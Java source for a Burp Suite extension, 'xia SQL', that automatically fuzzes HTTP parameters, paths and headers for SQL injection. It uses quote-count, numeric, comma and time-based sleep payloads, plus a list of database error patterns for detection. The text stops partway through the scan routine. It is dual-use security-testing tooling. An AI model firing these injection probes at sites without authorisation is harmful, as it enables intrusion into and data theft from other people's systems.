package burp;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Component;
import java.awt.Font;
import java.awt.GridLayout;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.lang.reflect.Method;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.Collections;
import java.util.HashSet;
import java.util.List;
import java.util.Optional;
import java.util.Set;
import java.util.concurrent.Semaphore;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JLabel;
import javax.swing.JMenuItem;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTabbedPane;
import javax.swing.JTable;
import javax.swing.JTextArea;
import javax.swing.JTextField;
import javax.swing.SwingUtilities;
import javax.swing.table.AbstractTableModel;
import javax.swing.table.DefaultTableCellRenderer;
import javax.swing.table.TableModel;

import burp.api.montoya.BurpExtension;
import burp.api.montoya.MontoyaApi;
import burp.api.montoya.core.ToolType;
import burp.api.montoya.http.Http;
import burp.api.montoya.http.handler.HttpHandler;
import burp.api.montoya.http.handler.HttpRequestToBeSent;
import burp.api.montoya.http.handler.HttpResponseReceived;
import burp.api.montoya.http.handler.RequestToBeSentAction;
import burp.api.montoya.http.handler.ResponseReceivedAction;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.HttpHeader;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.params.HttpParameterType;
import burp.api.montoya.http.message.params.ParsedHttpParameter;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import burp.api.montoya.ui.UserInterface;
import burp.api.montoya.ui.contextmenu.ContextMenuEvent;
import burp.api.montoya.ui.contextmenu.ContextMenuItemsProvider;
import burp.api.montoya.ui.editor.HttpRequestEditor;
import burp.api.montoya.ui.editor.HttpResponseEditor;

public class BurpExtender implements BurpExtension {

    private MontoyaApi api;
    private Http http;
    private UserInterface ui;

    private PrintWriter stdout;
    private JSplitPane splitPane;
    private HttpRequestEditor requestViewer;
    private HttpResponseEditor responseViewer;

    private final List<LogEntry>   log     = Collections.synchronizedList(new ArrayList<>());
    private final List<LogEntry>   log2    = Collections.synchronizedList(new ArrayList<>());
    private final List<LogEntry>   log3    = Collections.synchronizedList(new ArrayList<>());
    private final List<RequestMd5> log4Md5 = Collections.synchronizedList(new ArrayList<>());
    private final Set<String> scannedPathValues = Collections.synchronizedSet(new HashSet<>());
    private final Set<String> scannedHeaderNames = Collections.synchronizedSet(new HashSet<>());

    // ── 基础开关 ──────────────────────────────────────────────
    private int    switchs        = 1;
    private int    clicksRepeater = 0;
    private int    clicksProxy    = 0;
    private final AtomicInteger count      = new AtomicInteger(0);
    private volatile String dataMd5Id;
    private int    isInt          = 1;
    private int    jTextAreaInt   = 0;
    private String jTextAreaData1 = "";
    private int    diyPayload1    = 1;
    private int    diyPayload2    = 0;
    private Table  logTable;
    private int    isHeader       = -1;
    private int    isPath         = 2;
    private String whiteUrl       = "*";
    private int    whiteSwitchs   = 0;
    private volatile int maxConcurrentRequests = 80;
    private volatile Semaphore requestSemaphore = new Semaphore(8, true);
    private static final long SINGLE_REQUEST_SLOW_MS = 4000;
    private static final Set<String> HEADER_BLACKLIST = Set.of(
            "connection",
            "accept",
            "accept-language",
            "host",
            "content-length",
            "transfer-encoding"
    );
    private volatile Set<String> customHeaderBlacklist = new HashSet<>(Set.of(
            "connection",
            "accept",
            "accept-language",
            "host",
            "content-length",
            "transfer-encoding"
    ));
    private final AtomicInteger detailRefreshPending = new AtomicInteger(0);

    // ── 自定义报错信息 ────────────────────────────────────────
    private static final String DEFAULT_ERROR_PATTERNS =
            "ORA-\\d{5}\n" +
                    "SQL syntax.*?MySQL\n" +
                    "Unknown column\n" +
                    "SQL syntax\n" +
                    "java.sql.SQLSyntaxErrorException\n" +
                    "Error SQL:\n" +
                    "Syntax error\n" +
                    "附近有语法错误\n" +
                    "java.sql.SQLException\n" +
                    "引号不完整\n" +
                    "System.Exception: SQL Execution Error!\n" +
                    "com.mysql.jdbc\n" +
                    "MySQLSyntaxErrorException\n" +
                    "valid MySQL result\n" +
                    "your MySQL server version\n" +
                    "MySqlClient\n" +
                    "MySqlException\n" +
                    "valid PostgreSQL result\n" +
                    "PG::SyntaxError:\n" +
                    "org.postgresql.jdbc\n" +
                    "PSQLException\n" +
                    "Microsoft SQL Native Client error\n" +
                    "ODBC SQL Server Driver\n" +
                    "SQLServer JDBC Driver\n" +
                    "com.jnetdirect.jsql\n" +
                    "macromedia.jdbc.sqlserver\n" +
                    "com.microsoft.sqlserver.jdbc\n" +
                    "Microsoft Access\n" +
                    "Access Database Engine\n" +
                    "ODBC Microsoft Access\n" +
                    "Oracle error\n" +
                    "DB2 SQL error\n" +
                    "SQLite error\n" +
                    "Sybase message\n" +
                    "SybSQLException";
    private static final String DIY_PAYLOAD_FILE = "xia_SQL_diy_payload.ini";
    private static final String DEFAULT_DIY_PAYLOAD = "%df' and sleep(3)%23\n'and '1'='1";

    private String diyErrorText = DEFAULT_ERROR_PATTERNS;
    private volatile List<Pattern> compiledErrorPatterns = Collections.emptyList();

    // ── 日志面板 ─────────────────────────────────────────────
    private JTextArea logTextArea;

    public MyModel model = new MyModel();

    // =========================================================
    // initialize
    // =========================================================
    @Override
    public void initialize(MontoyaApi api) {
        this.api  = api;
        this.http = api.http();
        this.ui   = api.userInterface();

        stdout = new PrintWriter(new OutputStream() {
            @Override public void write(int b) {}
            @Override
            public void write(byte[] b, int off, int len) {
                api.logging().logToOutput(new String(b, off, len, StandardCharsets.UTF_8));
            }
        }, true);

        stdout.println("hello xia sql!");
        stdout.println("你好 欢迎使用 瞎注-子夜!");
        stdout.println("version:1.0");
        api.extension().setName("xiaSQL-ziye");
        refreshCompiledErrorPatterns();

        // HTTP 流量监听
        http.registerHttpHandler(new HttpHandler() {
            @Override
            public RequestToBeSentAction handleHttpRequestToBeSent(HttpRequestToBeSent request) {
                return RequestToBeSentAction.continueWith(request);
            }

            @Override
            public ResponseReceivedAction handleHttpResponseReceived(HttpResponseReceived response) {
                if (switchs != 1) return ResponseReceivedAction.continueWith(response);
                boolean fromRepeater = response.toolSource().isFromTool(ToolType.REPEATER);
                boolean fromProxy    = response.toolSource().isFromTool(ToolType.PROXY);
                if ((clicksRepeater == 1 && fromRepeater) || (clicksProxy == 1 && fromProxy)) {
                    HttpRequest         req = response.initiatingRequest();
                    HttpResponse        res = response;
                    HttpRequestResponse hrr = HttpRequestResponse.httpRequestResponse(req, res);
                    new Thread(() -> {
                        try { checkVul(hrr, 0); }
                        catch (Exception ex) { ex.printStackTrace(stdout); }
                    }).start();
                }
                return ResponseReceivedAction.continueWith(response);
            }
        });

        // 右键菜单
        ui.registerContextMenuItemsProvider(new ContextMenuItemsProvider() {
            @Override
            public List<Component> provideMenuItems(ContextMenuEvent event) {
                List<Component> items = new ArrayList<>();
                List<HttpRequestResponse> messages = new ArrayList<>(event.selectedRequestResponses());
                if (messages.isEmpty()) {
                    try {
                        Optional<?> editorMessage = event.messageEditorRequestResponse();
                        if (editorMessage.isPresent()) {
                            Object msg = editorMessage.get();
                            if (msg instanceof HttpRequestResponse) {
                                messages.add((HttpRequestResponse) msg);
                            } else {
                                try {
                                    Method rrMethod = msg.getClass().getMethod("requestResponse");
                                    Object rr = rrMethod.invoke(msg);
                                    if (rr instanceof HttpRequestResponse) {
                                        messages.add((HttpRequestResponse) rr);
                                    }
                                } catch (Exception ignored) {}
                            }
                        }
                    } catch (Exception ignored) {}
                }
                if (messages.isEmpty()) return items;
                JMenuItem item = new JMenuItem("Send to xia SQL");
                item.addActionListener(e -> {
                    if (switchs != 1) { stdout.println("插件xia SQL关闭状态！"); return; }
                    new Thread(() -> {
                        try { checkVul(messages.get(0), 1024); }
                        catch (Exception ex) { ex.printStackTrace(stdout); }
                    }).start();
                });
                items.add(item);
                return items;
            }
        });

        SwingUtilities.invokeLater(this::buildUi);
    }

    // =========================================================
    // 构建 UI
    // =========================================================
    private void buildUi() {
        splitPane = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);

        // ── 大左侧：上部(主表+结果表左右并排) / 下部(请求响应) ──
        JSplitPane bigLeftPanel = new JSplitPane(JSplitPane.VERTICAL_SPLIT);

        // 上部：主表(左) + 结果表(右) 水平并排
        JSplitPane tablesSplit = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);

        logTable = new Table(BurpExtender.this);
        JPanel logPanel = new JPanel(new GridLayout(1, 1));
        JScrollPane logScrollPane = new JScrollPane(logTable);
        logPanel.add(logScrollPane);

        TableLog2 table2 = new TableLog2(model);
        JPanel resultPanel = new JPanel(new BorderLayout());
        JLabel resultLabel = new JLabel("  SQL Injection Results (详细结果)");
        resultLabel.setOpaque(true);
        resultLabel.setBackground(new Color(230, 230, 230));
        resultLabel.setFont(new Font("Dialog", Font.BOLD, 14));
        JScrollPane resultScrollPane = new JScrollPane(table2);
        resultPanel.setBorder(null);
        resultScrollPane.setBorder(logScrollPane.getBorder());
        resultScrollPane.setViewportBorder(logScrollPane.getViewportBorder());
        resultPanel.add(resultLabel, BorderLayout.NORTH);
        resultPanel.add(resultScrollPane, BorderLayout.CENTER);

        tablesSplit.setLeftComponent(logPanel);
        tablesSplit.setRightComponent(resultPanel);
        tablesSplit.setResizeWeight(0.5);
        tablesSplit.setDividerLocation(480);

        // 下部：请求/响应
        JTabbedPane reqRespTabs = new JTabbedPane();
        requestViewer  = ui.createHttpRequestEditor();
        responseViewer = ui.createHttpResponseEditor();
        reqRespTabs.addTab("Request",  requestViewer.uiComponent());
        reqRespTabs.addTab("Response", responseViewer.uiComponent());

        bigLeftPanel.setTopComponent(tablesSplit);
        bigLeftPanel.setBottomComponent(reqRespTabs);
        bigLeftPanel.setResizeWeight(0.5);
        bigLeftPanel.setDividerLocation(400);

        // ── 右侧控制面板 ────────────────────────────────────
        JSplitPane rightPanel = new JSplitPane(JSplitPane.VERTICAL_SPLIT);
        JPanel ctrlPanel = new JPanel(new GridLayout(20, 1));
        ctrlPanel.add(new JLabel("插件名：瞎注 author：子夜"));
        ctrlPanel.add(new JLabel("blog:sunwu.world"));
        ctrlPanel.add(new JLabel("版本：xia SQL V3.3二开版本"));
        ctrlPanel.add(new JLabel("感谢名单：算命瞎子"));

        JCheckBox chkbox1 = new JCheckBox("启动插件", true);
        JCheckBox chkbox2 = new JCheckBox("监控Repeater");
        JCheckBox chkbox3 = new JCheckBox("监控Proxy");
        JCheckBox chkbox4 = new JCheckBox("测试Path", true);
        JCheckBox chkbox8 = new JCheckBox("测试Header");
        JTextField textField = new JTextField("*");
        JTextField concurrencyField = new JTextField("80");
        JTextField headerBlacklistField = new JTextField("Connection,Accept,Accept-Language,Host,Content-Length,Transfer-Encoding");
        JButton btn1 = new JButton("清空列表");
        JButton btn3 = new JButton("启动白名单");
        JButton btnConcurrency = new JButton("设置最大并发");
        JButton btnHeaderBlacklist = new JButton("设置Header黑名单");

        ctrlPanel.add(chkbox1);
        ctrlPanel.add(chkbox2);
        ctrlPanel.add(chkbox3);
        ctrlPanel.add(chkbox4);
        ctrlPanel.add(chkbox8);
        ctrlPanel.add(new JLabel("Header黑名单(逗号分隔)"));
        ctrlPanel.add(headerBlacklistField);
        ctrlPanel.add(btnHeaderBlacklist);
        ctrlPanel.add(new JLabel("全局最大并发请求数"));
        ctrlPanel.add(concurrencyField);
        ctrlPanel.add(btnConcurrency);
        ctrlPanel.add(btn1);
        ctrlPanel.add(new JLabel("白名单目标支持逗号分隔，例如 *.baidu.com"));
        ctrlPanel.add(textField);
        ctrlPanel.add(btn3);

        // ── 右侧 Tab ────────────────────────────────────────
        JTabbedPane tabDiy = new JTabbedPane();

        // Tab1：自定义 payload
        JPanel yx1Panel = new JPanel(new BorderLayout());
        JPanel yx1Top   = new JPanel(new GridLayout(5, 1));
        JCheckBox chkbox5 = new JCheckBox("自定义payload");
        JCheckBox chkbox6 = new JCheckBox("自定义payload中空格url编码", true);
        JCheckBox chkbox7 = new JCheckBox("自定义payload中参数值置空");
        JButton   btn2    = new JButton("加载/重新加载payload");
        yx1Top.add(new JLabel("修改payload后记得点击加载"));
        yx1Top.add(chkbox5);
        yx1Top.add(chkbox6);
        yx1Top.add(chkbox7);
        yx1Top.add(btn2);

        JTextArea jta = new JTextArea(DEFAULT_DIY_PAYLOAD, 18, 16);
        jta.setText(loadDiyPayloadText());
        jta.setForeground(Color.BLACK);
        jta.setFont(new Font("楷体", Font.BOLD, 16));
        jta.setBackground(Color.LIGHT_GRAY);
        jta.setEditable(false);
        yx1Panel.add(yx1Top, BorderLayout.NORTH);
        yx1Panel.add(new JScrollPane(jta), BorderLayout.CENTER);
        tabDiy.addTab("自定义SQL语句", yx1Panel);

        // Tab2：自定义报错信息
        JSplitPane yx2Sp = new JSplitPane(JSplitPane.VERTICAL_SPLIT);
        JPanel yx2Top = new JPanel();
        JCheckBox chkboxDiyError = new JCheckBox("启用自定义报错信息（支持正则表达式）", true);
        yx2Top.add(chkboxDiyError);
        JTextArea diyErrorJta = new JTextArea(DEFAULT_ERROR_PATTERNS, 18, 24);
        diyErrorJta.setEditable(false);
        diyErrorJta.setBackground(Color.LIGHT_GRAY);
        diyErrorJta.setFont(new Font(Font.MONOSPACED, Font.PLAIN, 13));
        diyErrorText = diyErrorJta.getText();
        JPanel yx2Bottom = new JPanel(new GridLayout(1, 1));
        yx2Bottom.add(new JScrollPane(diyErrorJta));
        yx2Sp.setTopComponent(yx2Top);
        yx2Sp.setBottomComponent(yx2Bottom);
        yx2Sp.setResizeWeight(0.15);
        tabDiy.addTab("自定义报错信息", yx2Sp);

        // Tab3：日志
        JSplitPane yx3Sp = new JSplitPane(JSplitPane.VERTICAL_SPLIT);
        JPanel yx3Top = new JPanel();
        JButton logBtn = new JButton("清空日志");
        yx3Top.add(logBtn);
        logTextArea = new JTextArea("");
        logTextArea.setEditable(false);
        logTextArea.setFont(new Font(Font.MONOSPACED, Font.PLAIN, 12));
        JPanel yx3Bottom = new JPanel(new GridLayout(1, 1));
        yx3Bottom.add(new JScrollPane(logTextArea));
        yx3Sp.setTopComponent(yx3Top);
        yx3Sp.setBottomComponent(yx3Bottom);
        yx3Sp.setResizeWeight(0.1);
        tabDiy.addTab("日志", yx3Sp);

        rightPanel.setTopComponent(ctrlPanel);
        rightPanel.setBottomComponent(tabDiy);

        splitPane.setLeftComponent(bigLeftPanel);
        splitPane.setRightComponent(rightPanel);
        splitPane.setDividerLocation(1000);

        // ── 事件绑定 ─────────────────────────────────────────
        chkbox1.addItemListener(e -> {
            switchs = chkbox1.isSelected() ? 1 : 0;
            stdout.println(chkbox1.isSelected() ? "插件xia SQL启动" : "插件xia SQL关闭");
        });
        chkbox2.addItemListener(e -> {
            clicksRepeater = chkbox2.isSelected() ? 1 : 0;
            stdout.println((chkbox2.isSelected() ? "启动" : "关闭") + " 监控Repeater");
        });
        chkbox3.addItemListener(e -> {
            clicksProxy = chkbox3.isSelected() ? 1 : 0;
            stdout.println((chkbox3.isSelected() ? "启动" : "关闭") + " 监控Proxy");
        });
        chkbox4.addItemListener(e -> {
            isPath = chkbox4.isSelected() ? 2 : -1;
            stdout.println((chkbox4.isSelected() ? "启动" : "关闭") + " 测试Path");
        });
        chkbox5.addItemListener(e -> {
            if (chkbox5.isSelected()) {
                jta.setEditable(true);
                jta.setBackground(Color.WHITE);
                jTextAreaInt   = 1;
                jTextAreaData1 = (diyPayload1 == 1) ? jta.getText().replace(" ", "%20") : jta.getText();
                stdout.println("启动 自定义payload");
            } else {
                jta.setEditable(false);
                jta.setBackground(Color.LIGHT_GRAY);
                jTextAreaInt = 0;
                stdout.println("关闭 自定义payload");
            }
        });
        chkbox6.addItemListener(e -> {
            if (chkbox6.isSelected()) {
                diyPayload1    = 1;
                jTextAreaData1 = jta.getText().replace(" ", "%20");
                stdout.println("启动 空格url编码");
            } else {
                diyPayload1    = 0;
                jTextAreaData1 = jta.getText();
                stdout.println("关闭 空格url编码");
            }
        });
        chkbox7.addItemListener(e -> {
            diyPayload2 = chkbox7.isSelected() ? 1 : 0;
            stdout.println((chkbox7.isSelected() ? "启动" : "关闭") + " 自定义payload参数值置空");
        });
        chkbox8.addItemListener(e -> {
            isHeader = chkbox8.isSelected() ? 2 : -1;
            stdout.println((chkbox8.isSelected() ? "启动" : "关闭") + " 测试Header");
        });
        chkboxDiyError.addItemListener(e -> {
            if (chkboxDiyError.isSelected()) {
                diyErrorText = diyErrorJta.getText();
                refreshCompiledErrorPatterns();
                diyErrorJta.setEditable(false);
                diyErrorJta.setBackground(Color.LIGHT_GRAY);
                stdout.println("启用 自定义报错信息");
            } else {
                diyErrorJta.setEditable(true);
                diyErrorJta.setBackground(Color.WHITE);
                diyErrorText = DEFAULT_ERROR_PATTERNS;
                refreshCompiledErrorPatterns();
                stdout.println("关闭 自定义报错信息（保留默认规则）");
            }
        });
        btn1.addActionListener(e -> {
            log.clear(); log2.clear(); log3.clear(); log4Md5.clear(); scannedPathValues.clear(); scannedHeaderNames.clear();
            count.set(0);
            fireTableDataChanged();
            model.fireTableDataChanged();
        });
        btn2.addActionListener(e -> {
            jTextAreaData1 = (diyPayload1 == 1) ? jta.getText().replace(" ", "%20") : jta.getText();
            if (saveDiyPayloadText(jTextAreaData1)) {
                stdout.println("payload 已加载");
            } else {
                stdout.println("payload 保存失败，请检查文件权限");
            }
        });
        textField.setEditable(true);
        textField.setForeground(Color.BLACK);
        btn3.addActionListener(e -> {
            if (btn3.getText().equals("启动白名单")) {
                btn3.setText("关闭白名单");
                whiteUrl = textField.getText() == null ? "*" : textField.getText().trim();
                if (whiteUrl.isEmpty()) whiteUrl = "*";
                whiteSwitchs = 1;
                textField.setEditable(false);
                textField.setForeground(Color.GRAY);
                stdout.println("已启用白名单: " + whiteUrl);
            } else {
                btn3.setText("启动白名单");
                whiteSwitchs = 0;
                textField.setEditable(true);
                textField.setForeground(Color.BLACK);
                stdout.println("已关闭白名单");
            }
        });
        btnConcurrency.addActionListener(e -> {
            String text = concurrencyField.getText() == null ? "" : concurrencyField.getText().trim();
            int value;
            try {
                value = Integer.parseInt(text);
            } catch (Exception ex) {
                stdout.println("最大并发设置失败：请输入正整数");
                return;
            }
            if (value <= 0) {
                stdout.println("最大并发设置失败：请输入正整数");
                return;
            }
            maxConcurrentRequests = value;
            requestSemaphore = new Semaphore(maxConcurrentRequests, true);
            stdout.println("最大并发请求数已设置为 " + maxConcurrentRequests);
        });
        btnHeaderBlacklist.addActionListener(e -> {
            String text = headerBlacklistField.getText() == null ? "" : headerBlacklistField.getText().trim();
            Set<String> parsed = parseHeaderBlacklist(text);
            customHeaderBlacklist = parsed;
            stdout.println("Header黑名单已设置为: " + String.join(",", parsed));
        });
        logBtn.addActionListener(e -> logTextArea.setText(""));

        api.userInterface().registerSuiteTab("xia SQL", splitPane);
    }

    // =========================================================
    // 漏洞检测核心逻辑
    // =========================================================
    private void checkVul(HttpRequestResponse baseRequestResponse, int toolFlag) {
        int    isAdd       = 0;
        String changeSign1 = "";

        HttpRequest  req  = baseRequestResponse.request();
        HttpResponse resp = baseRequestResponse.response();
        String scanId = "RID-" + System.nanoTime();
        String requestHost = extractHost(req.url().toString());

        List<ScanTarget> targets = buildScanTargets(req);
        String requestBase = req.url().toString().split("\\?")[0];

        // 白名单过滤
        if (whiteSwitchs == 1) {
            if (!isWhitelistedHost(requestHost, whiteUrl)) {
                appendLog("不是白名单目标 host=" + requestHost + " url=" + requestBase);
                return;
            }
        }

        // 静态文件过滤
        if (toolFlag != 1024) {
            String[] staticFiles = {"jpg","png","gif","css","js","pdf","mp3","mp4","avi"};
            String[] parts = requestBase.split("\\.");
            String ext = parts[parts.length - 1].toLowerCase();
            for (String s : staticFiles) {
                if (ext.equals(s)) { appendLog("静态文件跳过：" + requestBase); return; }
            }
        }

        // 构建 MD5 去重 key
        for (ScanTarget target : targets) {
            if (target.isHeaderTarget || target.isPathTarget || target.isXmlTarget || target.isJsonArrayTarget || target.isJsonDeepTarget || target.paramType == HttpParameterType.URL || target.paramType == HttpParameterType.BODY ||
                    target.paramType == HttpParameterType.JSON || target.paramType == HttpParameterType.MULTIPART_ATTRIBUTE) {
                isAdd = 1;
                requestBase += "+" + target.name;
            }
        }
        requestBase += "+" + req.method();
        String requestMd5 = md5(requestBase);

        synchronized (log4Md5) {
            for (RequestMd5 i : log4Md5) {
                if (i.md5Data.equals(requestMd5) && toolFlag != 1024) return;
            }
        }
        if (isAdd == 0) return;

        synchronized (log4Md5) {
            log4Md5.add(new RequestMd5(requestMd5));
        }

        if (resp == null || resp.statusCode() < 200 || resp.statusCode() >= 300) {
            appendLog(scanId + " 无响应或响应非2xx：" + req.url());
            return;
        }

        appendLog(scanId + " 开始检测 URL=" + req.url() + " 方法=" + req.method());

        // 添加主表占位行
        synchronized (log) {
            int row = log.size();
            log.add(new LogEntry(count.getAndIncrement(), toolFlag, baseRequestResponse,
                    req.url().toString(), "", "", "", requestMd5, 0, "run……", 999, false));
            SwingUtilities.invokeLater(() -> {
                fireTableRowsInserted(row, row);
                if (logTable != null && logTable.getSelectedRow() < 0) {
                    logTable.setRowSelectionInterval(row, row);
                }
            });
        }

        int baseRespLen = resp.body().length();
        boolean anyVulnFound = false;

        for (ScanTarget target : targets) {
            boolean valid = target.isHeaderTarget || target.isPathTarget || target.isXmlTarget || target.isJsonArrayTarget || target.isJsonDeepTarget || target.paramType == HttpParameterType.URL ||
                    target.paramType == HttpParameterType.BODY || target.paramType == HttpParameterType.JSON || target.paramType == HttpParameterType.MULTIPART_ATTRIBUTE;
            if (!valid) continue;

            String key   = target.name;
            String value = target.value;
            appendLog(scanId + " 测试参数：url=" + req.url() + " param=" + key + " value=" + value);
            int sentRequests = 0;
            boolean slowDetected = false;
            long quickBaselineCost = Long.MAX_VALUE;
            List<LogEntry> paramEntries = new ArrayList<>();
            List<LogEntry> quoteEntries = new ArrayList<>();
            List<LogEntry> numEntries = new ArrayList<>();
            List<LogEntry> commaEntries = new ArrayList<>();
            List<LogEntry> expEntries = new ArrayList<>();
            List<LogEntry> divEntries = new ArrayList<>();
            List<LogEntry> sleepEntries = new ArrayList<>();
            List<LogEntry> backtickEntries = new ArrayList<>();
            List<LogEntry> diyEntries = new ArrayList<>();
            List<LogEntry> fuzzyEntries = new ArrayList<>();

            // ================================================================
            // 新注入判断逻辑：发送 1~4 个单引号，根据响应长度规律判断注入
            //
            // 规则：
            //   设 len1=len('), len2=len(''), len3=len('''), len4=len('''')
            //   满足以下三个条件即判定为 SQL 注入：
            //     ① |len2 - len4| <= 5   （偶数引号长度相近）
            //     ② |len1 - len3| <= 5   （奇数引号长度相近）
            //     ③ |len1 - len2| > 5    （奇偶引号长度差异明显）
            // ================================================================

            // 发送四个基础 payload 并收集响应长度
            int[] quoteLens = new int[4]; // 下标 0=', 1='', 2=''', 3=''''
            HttpRequestResponse[] quoteResults = new HttpRequestResponse[4];
            String[] quotePayloads = {"'", "''", "'''", "''''"};

            for (int qi = 0; qi < 4; qi++) {
                HttpRequest qReq = buildMutatedRequest(req, target, value + quotePayloads[qi]);
                long t1 = System.currentTimeMillis();
                HttpRequestResponse qResult = sendRequestWithInterval(qReq);
                long cost = System.currentTimeMillis() - t1;
                sentRequests++;
                if (cost > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
                quoteResults[qi] = qResult;
                HttpResponse qResp = qResult.response();
                boolean qOk = (qResp != null && qResp.statusCode() >= 200 && qResp.statusCode() < 300);
                if (qOk && cost < quickBaselineCost) quickBaselineCost = cost;
                quoteLens[qi] = qOk ? qResp.body().length() : 0;

                // 记录到详情表
                int code = qOk ? qResp.statusCode() : 0;
                HttpRequestResponse qDisplay = buildDisplayMessage(qReq, qResult);
                LogEntry detail = addDetailEntry(new LogEntry(count.get(), toolFlag, qDisplay,
                        qReq.url().toString(),
                        key, value + quotePayloads[qi], "", requestMd5, (int) cost, "end", code, false));
                paramEntries.add(detail);
                quoteEntries.add(detail);
            }

            int len1 = quoteLens[0]; // '
            int len2 = quoteLens[1]; // ''
            int len3 = quoteLens[2]; // '''
            int len4 = quoteLens[3]; // ''''

            appendLog(String.format("  引号测试 [%s] len('=%d, ''=%d, '''=%d, ''''=%d)",
                    key, len1, len2, len3, len4));

            boolean cond1 = Math.abs(len2 - len4) <= 5; // 偶数引号长度相近
            boolean cond2 = Math.abs(len1 - len3) <= 5; // 奇数引号长度相近
            boolean cond3 = Math.abs(len1 - len2) >= 4;  // 奇偶引号长度差异明显

            boolean quoteVuln = cond1 && cond2 && cond3;
            boolean stopAfterCurrentRule = quoteVuln;

            // 数字参数检测：value-0-0-0 / value-abc
            boolean numVuln = false;
            if (!stopAfterCurrentRule && isInt == 1 && value.matches("^-?\\d+(\\.\\d+)?$")) {
                String baseBody = resp.bodyToString();

                String firstPayloadValue = value + "-0-0-0";
                HttpRequest firstReq = buildMutatedRequest(req, target, firstPayloadValue);

                long t1 = System.currentTimeMillis();
                HttpRequestResponse firstResult = sendRequestWithInterval(firstReq);
                long firstCost = System.currentTimeMillis() - t1;
                sentRequests++;
                if (firstCost > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
                HttpResponse firstResp = firstResult.response();
                boolean firstOk = (firstResp != null && firstResp.statusCode() >= 200 && firstResp.statusCode() < 300);
                if (firstOk && firstCost < quickBaselineCost) quickBaselineCost = firstCost;

                int firstCode = firstOk ? firstResp.statusCode() : 0;
                HttpRequestResponse firstDisplay = buildDisplayMessage(firstReq, firstResult);
                LogEntry firstDetail = addDetailEntry(new LogEntry(count.get(), toolFlag, firstDisplay,
                        firstReq.url().toString(),
                        key, firstPayloadValue, "", requestMd5, (int) firstCost, "end", firstCode, false));
                paramEntries.add(firstDetail);
                numEntries.add(firstDetail);

                double simBaseFirst = 0.0;
                if (firstOk) {
                    simBaseFirst = textSimilarity(baseBody, firstResp.bodyToString());
                }

                appendLog(String.format("  数字测试 [%s] sim(base, value-0-0-0)=%.4f",
                        key, simBaseFirst));

                if (firstOk && simBaseFirst > 0.90) {
                    String secondPayloadValue = value + "-abc";
                    HttpRequest secondReq = buildMutatedRequest(req, target, secondPayloadValue);

                    long t2 = System.currentTimeMillis();
                    HttpRequestResponse secondResult = sendRequestWithInterval(secondReq);
                    long secondCost = System.currentTimeMillis() - t2;
                    sentRequests++;
                    if (secondCost > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
                    HttpResponse secondResp = secondResult.response();
                    boolean secondOk = (secondResp != null && secondResp.statusCode() >= 200 && secondResp.statusCode() < 300);
                    if (secondOk && secondCost < quickBaselineCost) quickBaselineCost = secondCost;

                    int secondCode = secondOk ? secondResp.statusCode() : 0;
                    HttpRequestResponse secondDisplay = buildDisplayMessage(secondReq, secondResult);
                    LogEntry secondDetail = addDetailEntry(new LogEntry(count.get(), toolFlag, secondDisplay,
                            secondReq.url().toString(),
                            key, secondPayloadValue, "", requestMd5, (int) secondCost, "end", secondCode, false));
                    paramEntries.add(secondDetail);
                    numEntries.add(secondDetail);

                    if (secondOk) {
                        String firstBody = firstResp.bodyToString();
                        String secondBody = secondResp.bodyToString();
                        double simBaseSecond = textSimilarity(baseBody, secondBody);
                        double simFirstSecond = textSimilarity(firstBody, secondBody);
                        numVuln = simBaseSecond < 0.90 && simFirstSecond < 0.90;

                        appendLog(String.format("  数字测试 [%s] sim(base, value-abc)=%.4f sim(value-0-0-0, value-abc)=%.4f result=%s",
                                key, simBaseSecond, simFirstSecond, numVuln));
                    }
                }
            }
            if (numVuln) {
                stopAfterCurrentRule = true;
            }

            // 逗号拼接检测：,0 / ,XXXXXX / ,1 / ,2（Jaccard 相似度）
            boolean commaVuln = false;
            if (!stopAfterCurrentRule) {
                String baseBody = resp.bodyToString();

                String poc1Value = value + ",0";
                HttpRequest poc1Req = buildMutatedRequest(req, target, poc1Value);
                long t1 = System.currentTimeMillis();
                HttpRequestResponse poc1Result = sendRequestWithInterval(poc1Req);
                long cost1 = System.currentTimeMillis() - t1;
                sentRequests++;
                if (cost1 > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
                HttpResponse poc1Resp = poc1Result.response();
                boolean poc1Ok = (poc1Resp != null && poc1Resp.statusCode() >= 200 && poc1Resp.statusCode() < 300);
                if (poc1Ok && cost1 < quickBaselineCost) quickBaselineCost = cost1;

                int code1 = poc1Ok ? poc1Resp.statusCode() : 0;
                HttpRequestResponse poc1Display = buildDisplayMessage(poc1Req, poc1Result);
                LogEntry poc1Entry = addDetailEntry(new LogEntry(count.get(), toolFlag, poc1Display,
                        poc1Req.url().toString(),
                        key, poc1Value, "", requestMd5, (int) cost1, "end", code1, false));
                paramEntries.add(poc1Entry);
                commaEntries.add(poc1Entry);

                double simBasePoc1 = 0.0;
                if (poc1Ok) {
                    simBasePoc1 = jaccardSimilarity(baseBody, poc1Resp.bodyToString());
                }
                appendLog(String.format("  逗号测试 [%s] poc1=value,0 sim(base,poc1)=%.4f", key, simBasePoc1));

                if (poc1Ok && simBasePoc1 < 0.90) {
                    String poc2Value = value + ",XXXXXX";
                    HttpRequest poc2Req = buildMutatedRequest(req, target, poc2Value);
                    long t2 = System.currentTimeMillis();
                    HttpRequestResponse poc2Result = sendRequestWithInterval(poc2Req);
                    long cost2 = System.currentTimeMillis() - t2;
                    sentRequests++;
